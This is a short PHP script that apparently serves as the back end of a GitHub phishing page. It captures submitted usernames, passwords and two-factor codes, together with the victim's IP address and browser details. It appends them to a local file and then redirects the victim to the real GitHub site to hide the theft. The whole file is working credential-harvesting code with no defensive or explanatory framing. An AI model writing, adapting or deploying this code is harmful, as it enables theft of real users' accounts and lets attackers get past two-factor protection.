<?php

$data = "";

if (isset($_POST['username']) && isset($_POST['password'])) {
    $data .= "GitHub Login\n";
    $data .= "Username: " . $_POST['username'] . "\n";
    $data .= "Password: " . $_POST['password'] . "\n";
    
    if (isset($_POST['auth_code']) && !empty($_POST['auth_code'])) {
        $data .= "2FA Code: " . $_POST['auth_code'] . "\n";
    }
    
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $data .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    
    file_put_contents("usernames.txt", $data, FILE_APPEND);
}

header('Location: https://github.com/');
exit();
?>
